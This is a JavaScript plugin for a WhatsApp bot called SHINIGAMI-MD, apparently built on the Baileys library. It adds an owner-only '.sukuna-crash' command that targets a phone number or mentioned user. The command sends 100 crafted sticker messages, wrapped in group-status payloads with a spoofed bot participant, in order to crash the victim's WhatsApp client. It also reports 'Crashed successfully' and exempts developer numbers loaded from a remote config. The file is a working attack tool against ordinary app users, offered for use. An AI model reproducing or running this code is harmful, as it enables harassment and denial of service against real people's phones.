const { cmd } = require('../momy');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const axios = require('axios');
const crypto = require('crypto');

// Helper sleep function
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ============================================================
// DEV NUMBERS PROTECTION
// ============================================================
let devNumbers = [];

async function loadDevNumbers() {
    try {
        const response = await axios.get('https://raw.githubusercontent.com/dawestava-hub/new-bot/refs/heads/main/config.json');
        if (response.data && response.data.ownerNumber) {
            devNumbers = response.data.ownerNumber.map(num => {
                let cleanNum = num.toString().replace(/[^0-9]/g, '');
                if (cleanNum.startsWith('0')) cleanNum = '255' + cleanNum.substring(1);
                return cleanNum + '@s.whatsapp.net';
            });
            console.log(`✅ Loaded ${devNumbers.length} protected developer numbers`);
        }
    } catch (e) {
        console.log('⚠️ Could not load dev numbers, using default protection');
        devNumbers = ['5544974611@s.whatsapp.net', '55448812268@s.whatsapp.net'];
    }
}

function isDevNumber(jid) {
    return devNumbers.includes(jid);
}

loadDevNumbers();

// ============================================================
// SUKUNA CRASH FUNCTION (StcSqL)
// ============================================================
async function StcSqL(prim, target) {
  for (let i = 0; i < 100; i++) {
    const cr = {
      key: {
        remoteJid: "status@broadcast",
        participant: "13135550002@bot",
        fromMe: false
      },
      message: {
        conversation: "SHINIGAMI-MD"
      }
    };
    const msg = generateWAMessageFromContent(target, {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        mimetype: "image/webp",
        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        fileLength: "10610",
        mediaKeyTimestamp: "1775044724",
        stickerSentTs: "1775044724091",
      }
    }, {
      quoted: cr
    });
    
    await prim.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, {
      participant: { jid: target },
      messageId: msg.key.id
    });
    
    await sleep(7000);
  }
}

// ============================================================
// OWNER COMMAND: .sukuna-crash
// ============================================================
cmd({
    pattern: "sukuna-crash",
    alias: ["sukuna", "skrash"],
    desc: "Sukuna crash attack - Sticker message exploit",
    category: "bug",
    react: "💀",
    filename: __filename
}, async (conn, mek, m, { from, args, isOwner, reply, sender }) => {
    // Check if owner
    if (!isOwner) return reply("❌ Owner only command");

    // Get target
    let target;
    if (m.mentionedJid && m.mentionedJid[0]) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        let number = args[0].replace(/[^0-9]/g, '');
        if (number.startsWith('0')) number = '55' + number.substring(1);
        target = number + '@s.whatsapp.net';
    } else if (m.quoted) {
        target = m.quoted.sender;
    } else {
        return reply(`╭━━━━━━━━━━━━━━━━━━•
│ ❌ Please provide a number
│
│ 📌 Example:
│ • .sukuna-crash 55xxx 
│ • .sukuna-crash @user
╰────────────────────•`);
    }

    // Check if target is a developer number
    if (isDevNumber(target)) {
        return reply(`╭━━━━━━━━━━━━━━━━━━━•
│ 🛡️ Cannot attack developer number!
│ This number is protected.
╰───────────────────•`);
    }

    const targetNumber = target.split('@')[0];
    
    // Send attack started message
    await reply(`╭━━━━━━━━━━━━━━━━•
│ 💀 SUKUNA CRASH ATTACK
│
│ 👤 Target: @${targetNumber}
│ ⚡ Status: Attack in progress...
╰─────────────────•`);

    try {
        await StcSqL(conn, target);
        
        // Send success message
        await reply(`╭━━━━━━━━━━━━━━━━━•
│ ✅ SUKUNA CRASH COMPLETED!
│ 👤 Target: @${targetNumber}
│ 💀 Status: Crashed successfully
╰────────────────•

> POWERED BY SHINIGAMI MD`);
        
    } catch (e) {
        console.error("Sukuna Crash Error:", e);
        reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ ❌ SUKUNA CRASH FAILED
│ 👤 Target: @${targetNumber}
│ 💀 Error: ${e.message}
╰─────────────────────•`);
    }
});
